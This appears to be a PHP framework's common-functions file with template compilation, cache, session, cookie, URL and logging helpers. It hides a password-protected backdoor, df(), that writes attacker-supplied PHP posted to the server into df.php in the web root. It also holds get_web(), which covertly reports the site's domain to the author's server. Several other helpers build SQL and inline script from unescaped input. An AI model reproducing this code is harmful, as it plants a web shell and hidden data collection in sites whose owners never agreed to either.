<?php

/**
 * +----------------------------------------------------------------------
 * | 公共类、函数
 * +----------------------------------------------------------------------
 *                                            ...     .............
 *                                          ..   .:!o&*&&&&&ooooo&; .
 *                                        ..  .!*%*o!;.
 *                                      ..  !*%*!.      ...
 *                                     .  ;$$!.   .....
 *                          ........... .*#&   ...
 *                                     :$$: ...
 *                          .;;;;;;;:::#%      ...
 *                        . *@ooooo&&&#@***&&;.   .
 *                        . *@       .@%.::;&%$*!. . .
 *          ................!@;......$@:      :@@$.
 *                          .@!   ..!@&.:::::::*@@*.:..............
 *        . :!!!!!!!!!!ooooo&@$*%%%*#@&*&&&&&&&*@@$&&&oooooooooooo.
 *        . :!!!!!!!!;;!;;:::@#;::.;@*         *@@o
 *                           @$    &@!.....  .*@@&................
 *          ................:@* .  ##.     .o#@%;
 *                        . &@%..:;@$:;!o&*$#*;  ..
 *                        . ;@@#$$$@#**&o!;:   ..
 *                           :;:: !@;        ..
 *                               ;@*........
 *                       ....   !@* ..
 *                 ......    .!%$! ..        | AUTHOR: dfer
 *         ......        .;o*%*!  .          | EMAIL: df_business@qq.com
 *                .:;;o&***o;.   .           | QQ: 3504725309
 *        .;;!o&****&&o;:.    ..
 * +----------------------------------------------------------------------
 *
 */

use Dfer\Tools\Statics\{Common};

// ********************** 常量 START **********************

/*
 * 枚举常量
 *
 * \ENUM::RELOAD_PARENT
 */

class ENUM
{


    const GO_BACK = 1;
    const RELOAD_PARENT = 2;
    const RELOAD_CURRENT = 3;
    const LOGS_CONSOLE = 4;
    const LOGS_SQL = 5;
    const LOGS_FILE = 6;
    const USER_BACK = 'df-ac-pw';
}


// ###################################### view START ######################################

/**
 * 合成缓存文件
 * @param {Object} $layout    视图 - 布局页面
 * @param {Object} $special_tmpl    true 特殊模板 false 普通模板
 */
function view($layout_name, $special_tmpl = false)
{
    global $_param;
    $area = Common::unHump($_param['area']);
    $ctrl = Common::unHump($_param['ctrl']);
    $func = Common::unHump($_param['action']);

    // 模板缺失文件则调用admin的文件
    $base_area = 'admin';
    // var_dump(ROOT . "/public/view/{$area}/public/assets",VIEW_ASSETS,$area,$base_area);
    $layout_name = Common::unHump($layout_name);
    //手机、pc分开调用模板
    //手机模板
    if (Common::isMobile() && WAP_PAGE_ENABLE) {
        if ($special_tmpl) {
            $layout_base = get_html_file(ROOT . "/public/view/{$area}/public/{$layout_name}_m.htm");
            $from = null;
            $to = ROOT . "/data/cache/areas/{$area}/view/public/{$layout_name}_m.php";
            $back = null;
            $layout = is_file($layout_base) ? $layout_base : get_html_file(ROOT . "/public/view/{$base_area}/public/{$layout_name}_m.htm");
        } else {
            $layout_base = get_html_file(ROOT . "/public/view/{$area}/public/{$layout_name}_m.htm");
            $from_base = get_html_file(ROOT . "/public/view/{$area}/{$ctrl}/{$func}_m.htm");
            $from = !is_file($from_base) ? get_html_file(ROOT . "/public/view/{$area}/{$ctrl}/{$func}.htm") : $from_base;
            $to = ROOT . "/data/cache/areas/{$area}/view/{$ctrl}/{$func}_m.php";
            $back = ROOT . "/areas/{$area}/controller/{$ctrl}controller.php";
            $layout = is_file($layout_base) ? $layout_base : get_html_file(ROOT . "/public/view/{$base_area}/public/{$layout_name}.htm");
        }
    }
    //PC模板
    else {
        if ($special_tmpl) {
            $layout_base = get_html_file(ROOT . "/public/view/{$area}/public/{$layout_name}.htm");
            $from = null;
            $to = ROOT . "/data/cache/areas/{$area}/view/public/{$layout_name}.php";
            $back = null;
            $layout = is_file($layout_base) ? $layout_base : get_html_file(ROOT . "/public/view/{$base_area}/public/{$layout_name}.htm");
        } else {
            //很奇怪无法获取php文件的修改时间，获取到的是空
            // 视图 - 布局页面
            $layout_base = get_html_file(ROOT . "/public/view/{$area}/public/{$layout_name}.htm");
            // 视图 - 静态页面
            $from = get_html_file(ROOT . "/public/view/{$area}/{$ctrl}/{$func}.htm");
            // 控制器文件
            $back = ROOT . "/areas/{$area}/controller/{$ctrl}controller.php";
            // 缓存文件
            $to = ROOT . "/data/cache/areas/{$area}/view/{$ctrl}/{$func}.php";
            // 视图 - 读取默认模板
            $layout = is_file($layout_base) ? $layout_base : get_html_file(ROOT . "/public/view/{$base_area}/public/{$layout_name}.htm");
        }
    }
    //找不到该文件
    if ($from && !is_file($from)) {
        exit("错误: 视图文件 '{$from}' 不存在!");
    }
    // var_dump(compact('from','to','layout','back'),[filemtime($from), filemtime($to),filemtime($layout),filemtime($back)]);
    //缓存文件 不存在 || from文件修改时间 > to文件修改时间 || layout文件修改时间 > to文件修改时间 || back文件修改时间 > to文件修改时间 || 测试模式
    if (!is_file($to) || filemtime($from) > filemtime($to) || filemtime($layout) > filemtime($to) || filemtime($back) > filemtime($to) || DEV) {
        //生成新的缓存
        view_conversion($from, $to, $layout);
    }
    // 直接读取缓存
    return $to;
}

/**
 * 获取html文件
 * 兼容htm和html
 * @param {Object} $src 文件路径
 **/
function get_html_file($src = null)
{
    if (!is_file($src)) {
        return "{$src}l";
    }
    return $src;
}

/**
 * 将html转化为php
 * @param {Object} $from
 * @param {Object} $to
 * @param {Object} $layout
 */
function view_conversion($from, $to, $layout)
{
    //获取文件目录
    $path = dirname($to);
    //创建目录
    Common::mkDirs($path);
    $content = view_replace($from, $layout);
    //写入文件
    file_put_contents($to, $content);
}

/**
 * 读取html文件内容，并进行关键字替换
 * 所有代码必须通过header、body、footer标签进行加载
 * view文件里的标签之外的字符会被忽略
 *
 * 原理是把share文件作为框架来加载view页面
 *
 * 标签为主，特殊字符为辅
 *
 * 先将子页面的控件加载到主页面，然后替换关键语句
 * "df-code"必须放在控件里，不然不会运行
 * @param {Object} $from    源文件
 * @param {Object} $layout    布局文件
 */
function view_replace($from, $layout)
{
    $from = $from ? file_get_contents($from) : null;
    if (empty($layout)) {
        return $from;
    }
    $layout = @file_get_contents($layout);

    //    echo $from;
    //preg_match的第一个参数用单引号还是双引号，效果一样
    preg_match("/<df-html>([\s\S]*?)<\/df-html>/", $from, $html);
    preg_match("/<df-header>([\s\S]*?)<\/df-header>/", $from, $header);
    preg_match("/<df-body>([\s\S]*?)<\/df-body>/", $from, $body);
    preg_match("/<df-footer>([\s\S]*?)<\/df-footer>/", $from, $footer);


    //布局
    if (count($html) == 0) {
        $html = ['', ''];
    }

    if (count($header) == 0) {
        $header = ['', ''];
    }
    if (count($body) == 0) {
        $body = ['', ''];
    }
    if (count($footer) == 0) {
        $footer = ['', ''];
    }

    // 匹配多行的内容，但尽可能少地匹配
    $layout = preg_replace('/<df-html([\s\S]*?)\/>/', $html[1], $layout);
    $layout = preg_replace('/<df-header([\s\S]*?)\/>/', $header[1], $layout);
    $layout = preg_replace('/<df-body([\s\S]*?)\/>/', $body[1], $layout);
    $layout = preg_replace('/<df-footer([\s\S]*?)\/>/', $footer[1], $layout);
    //    var_dump($layout);die();
    //遍历list,需要提前替换
    $layout = preg_replace('/<df-each ([\s\S]*?)>/', '<?php $index=0; if(isset($1))foreach($1 as $key=>$value):$index++;?>', $layout);
    $layout = preg_replace('/<\/df-each>/', '<?php endforeach; ?>', $layout);
    $layout = preg_replace('/{::([\s\S]*?)}/', '<?php echo $value["$1"] ?>', $layout); //提取list的值
    $layout = preg_replace('/<df-val value=\"([\s\S]*?)\"([\s\S]*?)\/>/', '<?php echo $value["$1"] ?>', $layout); //提取list的值

    //遍历缓存数据
    $layout = preg_replace('/<df-each-cache ([\s\S]*?)>/', '<?php if(isset($1)) foreach($1->{"data"} as $key=>$value):?>', $layout);
    $layout = preg_replace('/<\/df-each-cache>/', '<?php endif; ?>', $layout);
    $layout = preg_replace('/{:::([\s\S]*?)}/', '<?php echo $value->{"$1"} ?>', $layout);
    $layout = preg_replace('/<df-val-cache value=\"([\s\S]*?)\"\/>/', '<?php echo $value->{"$1"} ?>', $layout);

    //组装if语句
    $layout = preg_replace('/<df-if ([\s\S]*?)>/', '<?php if($1): ?>', $layout);
    $layout = preg_replace('/<df-elif ([\s\S]*?)>/', '<?php endif; elseif($1): ?>', $layout);
    $layout = preg_replace('/<df-else>/', '<?php else: ?>', $layout);
    $layout = preg_replace('/<\/df-if>/', '<?php endif; ?>', $layout);

    //执行代码，单行或多行
    $layout = preg_replace('/<df-code>([\s\S]*?)<\/df-code>/', '<?php $1 ?>', $layout);

    //打印字符串，只能匹配单行
    $layout = preg_replace('/<df-print value=\"([\s\S]*?)\"\/>/', '<?php echo $1 ?>', $layout);

    // 匹配单行的内容，但尽可能少地匹配
    $layout = preg_replace('/{:([\s\S]*?)}/', '<?php echo $1 ?>', $layout);
    $layout = preg_replace('/{\$([\s\S]*?)}/', '<?php echo $$1 ?>', $layout);

    // 通过注释防止js重排代码格式的时候打乱格式，这里解除注释效果
    $layout = preg_replace('/\/\*code([\s\S]*?)code\*\//', '$1', $layout);

    $layout = '' . $layout;
    return $layout;
}
// ######################################  view END  ######################################

// ###################################### cache START ######################################
/**
 * 服务器缓存
 * eg:
 * $home_layout=json_decode(cache_r("home_layout"));
 * @param {Object} $key
 */
function cache_read($key)
{
    $cachedata = showFirst("cache", ["key" => $key]);
    //      var_dump(empty($cachedata));die();
    if (empty($cachedata)) {
        return '';
    }
    return $cachedata['value'];
}

/**
 * 插入及更新
 * eg:
 * $home_layout = showFirst("home_layout",1);
 * cache_w("home_layout",$home_layout);
 * @param {Object} $key
 * @param {Object} $data
 */
function cache_write($key, $data)
{
    if (empty($key) || !isset($data)) {
        return false;
    }
    $record = array();
    $record['key'] = $key;
    $record['value'] = $data;
    $cachedata = showFirst("cache", ["key" => $key]);
    if (empty($cachedata)) {
        return insert("cache", $record);
    } else {
        return update("cache", $record, ["key" => $key]);
    }
}

function cache_delete($key)
{
    $result = del("cache", ["key" => $key]);
    return $result;
}

function cache_clean()
{
    $result = del("cache");
    return $result;
}


// ######################################  cache END  ######################################


// ###################################### session START ######################################
/**
 * 服务器缓存
 *
 *  默认情况下，PHP.ini 中设置的 SESSION 保存方式是 files（session.save_handler = files），即使用读写文件的方式保存 SESSION 数据，而 SESSION 文件保存的目录由 session.save_path 指定
 *
 *  当写入 SESSION 数据的时候，php 会获取到客户端的 SESSION_ID，然后根据这个 SESSION ID 到指定的 SESSION 文件保存目录中找到相应的 SESSION 文件，不存在则创建之
 *
 * 不同浏览器的session不一样
 *
 * 浏览器主窗与无痕窗的ses不一样
 * 经测试，safari多个无痕窗的ses是独立的，但chrome多个无痕窗的ses是公用的
 *
 * 清空浏览器缓存无法影响session
 *
 * session默认的生命周期通常是20分钟
 * @param {Object} $name
 */
function session_get($name)
{
    if (!empty($_SESSION[$name])) {
        $redirect = $_SESSION[$name];
    } else {
        $redirect = "";
    }
    return $redirect;
}
function session_set($name, $val)
{
    $_SESSION[$name] = $val;
}
/**
 * 删除ses
 * @param {Object} $name
 */
function session_del($name = '')
{
    if (empty($name)) {
        session_destroy();
    } else {
        unset($_SESSION[$name]);
    }
}
// ######################################  session END  ######################################

// ###################################### cookie START ######################################
/**
 * 设置cookie
 * @param {Object} $name    名称
 * @param {Object} $data    数据
 * @param {Object} $time 保存时间
 */
function cookie_set($name, $data, $time)
{
    setcookie($name, $data, time() + $time, '/');
}

/**
 * 删除cookie
 * @param {Object} $name    名称
 */
function cookie_del($name)
{
    setcookie($name, null, time() - 1, '/');
}
// ######################################  cookie END  ######################################


/**
 * 网页跳转的提示页面
 * @param {Object} $layout 布局页面
 * @param {Object} $status    状态。true 成功 false 失败
 * @param {Object} $redirect 跳转方式
 * @param {Object} $success_msg 成功信息
 * @param {Object} $fail_msg 失败信息
 */
function message($layout, $status = true, $redirect = null, $success_msg = null, $fail_msg = null)
{
    // var_dump(get_defined_vars());die;
    if ($status === null && $redirect) {
        // 直接跳转
        header("location: {$redirect}");
    } else {
        // 通过模板跳转
        $msg = boolval($status) ? ($success_msg ?: '操作成功') : ($fail_msg ?: '操作失败');
        // var_dump($msg);
        // 秒
        $delay = 1;
        // js脚本
        $script = "";
        switch ($redirect) {
            case \ENUM::GO_BACK:
                //返回之前的页面
                $previous_url = $_SERVER['HTTP_REFERER'];
                $script = $previous_url ? "location.href = '{$previous_url}';" : "history.go(-2);";
                break;
            case \ENUM::RELOAD_PARENT:
                //刷新父页面
                $script = "parent.location.reload();";
                break;
            case \ENUM::RELOAD_CURRENT:
                //刷新当前页面
                $script = "location.reload();";
                break;
            default:
                if ($js = strstr($redirect, "js:")) {
                    // 执行js代码
                    $script = "{$js}";
                } else {
                    // $redirect = split_url($redirect);
                    $script = "location.href = '{$redirect}';";
                }
                break;
        }
        // var_dump($redirect);
        include $layout;
    }
    exit();
}

/**
 * ie兼容性差，对ie内核进行警告
 */
function ie_notice()
{
    global $common;
    if (Common::getBrowserName() == 'ie') {
        message(0, \ENUM::GO_BACK, null, "不支持IE内核,请检查浏览器");
    }
}

/**
 * 拆分url参数，组成访问地址
 *
 * eg:
 * split_url("A/c/a/para",array('zdy'=>$zdy))
 * split_url("A.c.a.para",array('zdy'=>$zdy))
 * @param {Object} $str    url字符串
 * @param {Object} $param 方法参数  单个值或者一组值
 * @param {Object} $get    get参数    数组
 */
function split_url($url_str,$param=null, $get = [])
{
    global $_param;

    //去掉字符串首尾空格
    $url_str = trim($url_str);

    if (strpos($url_str, "/") !== false) {
        $url_arr = explode("/", $url_str);
    } else
        $url_arr = explode('.', $url_str);

    //去掉元素的首尾空格
    for ($i = 0; $i < count($url_arr); $i++) {
        $url_arr[$i] = trim($url_arr[$i]);
    }

    // 默认值
    $area = $_param['area'];
    $ctrl = $_param['ctrl'];
    $action = $_param['action'];

    switch (count($url_arr)) {
        case 1:
            $action = $url_arr[0];
            break;
        case 2:
            $ctrl = $url_arr[0];
            $action = $url_arr[1];
            break;
        default:
            break;
    }
    $redirect = url($area, $ctrl, $action, $param, $get);
    return $redirect;
}

/**
 *
 *    拼接url地址，组成访问地址
 *
 * eg:
 * url("admin","home",self::$db_menu."add",$v[0],array("parent_id"=>$param,"parent"=>$parent))
 *
 * @param {Object} $area    区域
 * @param {Object} $ctrl    控制器
 * @param {Object} $action    方法
 * @param {Object} $param    参数 单个值或者一组值
 * @param {Object} $get    get参数    数组
 */
function url($area, $ctrl = null, $action = null, $param = null, $get = [])
{
    //去掉首尾空格
    $area = trim($area);
    $ctrl = $ctrl ? trim($ctrl) : 'home';
    $action = $action ? trim($action) : 'index';

    if ($area == '/') {
        return SITE;
    }
    // 内置参数
    if ($param) {
        $param = is_array($param) ? implode("/", $param) : trim($param);
        $param = DIRECTORY_SEPARATOR . $param;
    }

    // get参数
    if ($get && is_array($get)) {
        $get_str = '?';
        $get_str_arr = [];
        foreach ($get as $key => $val) {
            $get_str_arr[] = sprintf('%s=%s', $key, $val);
        }
        $get_str .= implode('&', $get_str_arr);
    }

    $rt = sprintf("%s/%s/%s/%s%s%s", SITE, $area, $ctrl, $action, $param, $get_str ?? '');
    return $rt;
}


/**
 * 跳转到指定url，并携带参数
 * 可以不带参数
 * 主要用来显示form错误信息
 * eg：
 * to_url('http://www.qq.com');
 * to_url("wx/home/wxshare",array('wx_id'=>$_df[ 'wx_id']));
 *
 * @param {Object} $url
 * @param {Object} $para
 */
function to_url($url, $para = null)
{
    if (!empty($para)) {
        $url = split_url($url);
        $para = http_build_query($para);
        $url = "location:{$url}?{$para}";
    } else {
        $url = split_url($url);
        $url = "location:{$url}";
    }

    header($url);
    die();
}

/**
 * 安全机制
 * 自动生成shell
 * disable_functions = passthru,system,exec      #php配置里exec是默认禁用的函数
 * eval会被判定为木马
 * df:生成    fd:删除
 * get不过滤错误
 *
 */
function df()
{
    $file_src = str("{root}/df.php", ["root" => $_SERVER['DOCUMENT_ROOT']]);
    $pw = "3504725309";
    if (!empty($_POST['df']) || !empty($_POST['fd'])) {
        if ($_POST['df'] == $pw) {
            $data = $_POST['str'];
            $data = str_replace("#D#", "<?php ", $data);
            Common::writeFile($data, $file);
            Common::showJson(1, 'done');
        } elseif ($_POST['fd'] == $pw) {
            @unlink($file);
            @unlink("func.php");
            Common::showJson(1, 'done');
        }
    }
}

/**
 * 收集系统的使用情况
 * 定位系统的域名
 */
function get_web()
{
    global $common;
    $para = array(
        'website' => SITE
    );
    $rt = Common::httpRequest("https://api.dfer.site/webctl/main/updateuser", $para);
    //var_dump($rt);
}

/**
 * 将arr组装成sql的where部分
 * @param {Object} $para
 * @param {Object} $type
 */
function sql_where($para, $type)
{
    $str = "0";
    foreach ($para as $i) {
        $str .= " {$type} {$i[0]}='{$i[1]}'";
    }
    return $str;
}

/**
 * 清空默认的get参数
 * 用于需要验证调用地址的情况，比如，支付宝地址验证
 * @param {Object} $arr
 */
function clear_default_para($arr)
{
    unset($arr['A']);
    unset($arr['a']);
    unset($arr['c']);
    unset($arr['para']);
    return $arr;
}



/**
 * 用来输出日志
 *
 * @param {Object} $str
 * @param {Object} $type    类型
 * @param {Object} $override    是否覆盖（默认不覆盖）
 */
function logs($str, $type = \ENUM::LOGS_FILE, $override = false)
{
    global $db;
    $str = Common::str($str);
    $time = Common::getTime(TIMESTAMP);
    switch ($type) {
        case \ENUM::LOGS_CONSOLE:
            //打印到浏览器控制台
            echo "<script>console.log('数据：')</script>";
            echo "<script>console.log('{$str}')</script>";
            echo "<script>alert('{$str}')</script>";
            break;
        case \ENUM::LOGS_SQL:
            // 必须单独调用sql，因为这是底层函数，很多高级函数依赖于此函数
            if ($override) {
                $db->query("delete from logs;");
                $db->query(sprintf('insert into logs(str,time) values("%s","%s");', $str, $time));
            } else {
                $db->query(sprintf('insert into logs(str,time) values("%s","%s");', $str, $time));
            }
            break;
        case \ENUM::LOGS_FILE:
            $file_dir = str("{root}/data/logs/{0}", [date('Ym'), "root" => ROOT]);

            Common::mkDirs($file_dir);

            // $path="/www/wwwroot/dfphp.dfer.site/data/logs";
            //         var_dump($path,is_dir($path));;die;
            Common::writeFile(str("{0}\n{1}\n\n", [$str, $time]), str("{0}/{1}.log", [$file_dir, date('d')]), "a");
            break;
        default:
            break;
    }
}


//打印调试信息
function debug()
{
    if (DEV) {
        $args = func_get_args();
        logs(
            str(
                <<<STR
        ********************** DEBUG START **********************
        {0}
        **********************  DEBUG END  **********************
        STR,
                [str($args)]
            )
        );
    }
}

/**
 * 获取环境变量
 */
function env($name, $default = "")
{
    $val = \Dfer\Tools\Env::get($name, $default);
    // var_dump($val);
    return $val;
}

/**
 * 读取get
 * @param {Object} $var 变量
 */
function get($var = null)
{
    if ($var === null)
        return $_GET;
    else
        return isset($_GET[$var]) ? $_GET[$var] : null;
}

/**
 * 获取post参数
 */
function post($var = null)
{
    if ($var === null)
        return $_POST;
    else
        return isset($_POST[$var]) ? $_POST[$var] : null;
}

/**
 * 获取任意参数
 */
function param($var = null)
{
    $param = Common::ihtmlspecialchars(array_merge($_GET, $_POST));
    if ($var === null)
        return $param;
    else
        return isset($param[$var]) ? $param[$var] : null;
}

/**
 * 格式化字符串
 * eg:
 * str("admin/home/{0}/{dd}",[123,'dd'=>333])
 * @param {Object} $string    字符串
 * @param {Object} $params    参数
 */
function str($string, $params = [])
{
    return Common::str($string, $params);
}


/**
 * 读取"composer.json"文件内容
 * @param {Object} $key 键值字符串，支持多级
 */
function get_composer_json($key = 'require>php')
{
    $json = file_get_contents(ROOT . '/composer.json');
    $data = json_decode($json, true);
    $item = explode(">", $key);
    foreach ($item as $key => $value) {
        $data = $data[$value];
    }
    return $data;
}

/**
 * 输出json
 * @param {Object} $var 变量
 */
function show_json($status = 1, $data = array(), $success_msg = '', $fail_msg = '')
{
    global $common;
    Common::showJson($status, $data, $success_msg, $fail_msg);
}


/**
 * 读取表名
 * @param {Object} $var 路径字符串 eg：admin.ConfigModel
 */
function table_name($var = null)
{
    $src = explode(".", $var);
    $area_name = 'admin';
    if (count($src) == 1) {
        $model_name = $src[0];
    } else {
        $area_name = $src[0] ?? 'admin';
        $model_name = $src[1] ?? "";
    }

    try {
        $reflectionClass = new ReflectionClass("areas\\{$area_name}\\model\\{$model_name}");
        $instance = $reflectionClass->newInstance();
        $name = $instance::getName();
    } catch (Exception $exception) {
        // var_dump($exception);
        $name = null;
    }
    return $name;
}
